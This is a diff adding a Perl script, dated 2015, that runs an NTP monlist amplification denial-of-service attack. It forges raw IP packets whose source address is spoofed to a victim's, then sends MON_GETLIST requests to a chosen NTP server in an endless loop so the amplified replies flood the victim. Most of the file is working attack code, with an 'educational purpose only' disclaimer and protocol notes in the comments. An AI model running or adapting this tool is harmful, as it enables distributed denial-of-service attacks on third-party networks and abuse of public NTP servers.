@@ -1,0 +1,195 @@
+#!/usr/bin/perl
+#
+#  ntp MON_GETLIST query amplification ddos
+#
+#  Copyright 2015 (c) Todor Donev 
+#  todor.donev@gmail.com
+#  http://www.ethical-hacker.org/
+#  https://www.facebook.com/ethicalhackerorg
+#
+#  A Network Time Protocol (NTP) Amplification 
+#  attack is an emerging form of Distributed 
+#  Denial of Service (DDoS) that relies on the 
+#  use of publically accessible NTP servers to 
+#  overwhelm a victim system with UDP traffic.
+#  The NTP service supports a monitoring service 
+#  that allows administrators to query the server 
+#  for traffic counts of connected clients. This 
+#  information is provided via the “monlist” 
+#  command. The basic attack technique consists 
+#  of an attacker sending a "get monlist" request 
+#  to a vulnerable NTP server, with the source 
+#  address spoofed to be the victim’s address. 
+#
+#
+#  Disclaimer:
+#  This or previous program is for Educational
+#  purpose ONLY. Do not use it without permission.
+#  The usual disclaimer applies, especially the
+#  fact that Todor Donev is not liable for any
+#  damages caused by direct or indirect use of the
+#  information or functionality provided by these
+#  programs. The author or any Internet provider
+#  bears NO responsibility for content or misuse
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact
+#  that any damage (dataloss, system crash,
+#  system compromise, etc.) caused by the use
+#  of these programs is not Todor Donev's
+#  responsibility.
+#
+#  Use at your own risk and educational 
+#  purpose ONLY!
+#
+#  See also, UDP-based Amplification Attacks:
+#  https://www.us-cert.gov/ncas/alerts/TA14-017A
+#
+#
+
+use Socket;
+
+if ( $< != 0 ) {
+   print "Sorry, must be run as root!\n";
+   print "This script use RAW Socket.\n"; 
+   exit;
+}
+
+my $ntpd            = (gethostbyname($ARGV[0]))[4];         # IP Address Destination        (32 bits)
+my $victim          = (gethostbyname($ARGV[1]))[4];         # IP Address Source             (32 bits)
+
+print "[ ntpd MON_GETLIST query amplification ]\n";
+if (!defined $ntpd || !defined $victim) {
+    print "[ Usg: $0 <ntp server> <victim>\n";
+    print "[ <todor.donev\@gmail.com>  Todor Donev ]\n";
+    exit;
+}
+print "[ Sending NTP packets: $ARGV[0] -> $ARGV[1]\n";
+socket(RAW, PF_INET, SOCK_RAW, 255) or die $!;
+setsockopt(RAW, 0, 1, 1) or die $!;
+main();
+
+    # Main program
+sub main {
+    my $packet;
+    
+    $packet = iphdr();
+    $packet .= udphdr();
+    $packet .= ntphdr();
+    # b000000m...
+    send_packet($packet);
+}
+
+    # IP header (Layer 3)
+sub iphdr {
+    my $ip_ver         	= 4;					# IP Version 4			(4 bits)
+    my $iphdr_len      	= 5;					# IP Header Length		(4 bits)
+    my $ip_tos         	= 0;					# Differentiated Services	(8 bits)
+    my $ip_total_len   	= $iphdr_len + 20;			# IP Header Length + Data	(16 bits)
+    my $ip_frag_id     	= 0;					# Identification Field		(16 bits)
+    my $ip_frag_flag   	= 000;					# IP Frag Flags (R DF MF)	(3 bits)
+    my $ip_frag_offset 	= 0000000000000;			# IP Fragment Offset		(13 bits)
+    my $ip_ttl         	= 255;					# IP TTL			(8 bits)
+    my $ip_proto       	= 17;					# IP Protocol			(8 bits)
+    my $ip_checksum    	= 0;					# IP Checksum			(16 bits)
+
+    # IP Packet
+	my $iphdr	= pack(
+			'H2 H2 n n B16 h2 c n a4 a4',
+			$ip_ver . $iphdr_len, $ip_tos, 
+			$ip_total_len, $ip_frag_id, 
+			$ip_frag_flag . $ip_frag_offset,
+			$ip_ttl, $ip_proto, $ip_checksum,
+			$victim, $ntpd
+			);
+			return $iphdr;
+}
+
+    # UDP Header (Layer 4)
+sub udphdr {
+    my $udp_src_port	= 31337;			# UDP Sort Port		(16 bits) (0-65535)
+    my $udp_dst_port	= 123;				# UDP Dest Port		(16 btis) (0-65535)
+    my $udp_len		= 8 + length(ntphdr());		# UDP Length		(16 bits) (0-65535)
+    my $udp_checksum 	= 0;				# UDP Checksum		(16 bits) (XOR of header)
+
+    # UDP Packet
+    my $udphdr		= pack(
+			'n n n n',
+			$udp_src_port, 
+			$udp_dst_port,
+			$udp_len, 
+			$udp_checksum
+			);
+	return $udphdr;
+}
+
+    # NTP Header (Layer 7)
+sub ntphdr {
+    my $rm_vn_mode	= 0x27;
+    
+ 		# Response bit to 0, More bit to 0, Version field to 2, Mode field to 7
+ 		#
+ 		# A mode 7 packet is used exchanging data between an NTP server
+ 		# and a client for purposes other than time synchronization, e.g.
+ 		# monitoring, statistics gathering and configuration.  A mode 7
+ 		# packet has the following format:
+ 		#
+ 		#    0                    1                   2                   3
+ 		#    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#   |R|M| VN  | Mode|A|  Sequence   | Implementation|   Req Code    |
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#   |  Err  | Number of data items  |  MBZ  |   Size of data item   |
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#   |                                                               |
+ 		#   |            Data (Minimum 0 octets, maximum 500 octets)        |
+ 		#   |                                                               |
+ 		#   |                           [...]                               |
+ 		#   |                                                               |
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#   |               Encryption Keyid (when A bit set)               |
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#   |                                                               |
+ 		#   |          Message Authentication Code (when A bit set)         |
+ 		#   |                                                               |
+ 		#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ 		#
+ 		# where the fields are (note that the client sends requests, the server
+ 		# responses):
+ 		# Response Bit:	This packet is a response (if clear, packet is a request).
+ 		# More Bit:	Set for all packets but the last in a response which
+ 		#		requires more than one packet.
+ 		# Version Number: 2 for current version
+ 		# Mode:	Always 7
+    my $auth		= 0x00;				# If set, this packet is authenticated.
+
+    my $implementation	= 0x03;				# Iimplementation: 0x00 (UNIV), 0x02 (XNTPD_OLD), 0x03 (XNTPD)
+							# The number of the implementation this request code
+							# is defined by.  An implementation number of zero is used
+							# for requst codes/data formats which all implementations
+							# agree on.  Implementation number 255 is reserved (for
+							# extensions, in case we run out).
+
+    my $request		= 0x2a;				# Request code is an implementation-specific code which specifies the
+							# operation to be (which has been) performed and/or the
+							# format and semantics of the data included in the packet 
+							# 0x02 (PEER_INFO), 0x03 (PEER_STATS), 0x04 (SYS_INFO),
+							# 0x04 (SYS_STATS), 0x2a (MON_GETLIST)   
+    # NTP packet
+    my $ntphdr		= pack(
+                        'W2 C2 C2 C2', 
+			$rm_vn_mode,
+                        $auth,
+			$implementation, 
+			$request
+			);
+return $ntphdr;
+}
+
+sub send_packet {
+    while(1){
+    select(undef, undef, undef, 0.30);			# Sleep 300 milliseconds
+    send(RAW, $_[0], 0, pack('Sna4x8', AF_INET, 60, $ntpd)) or die $!;
+   }
+}
+
+
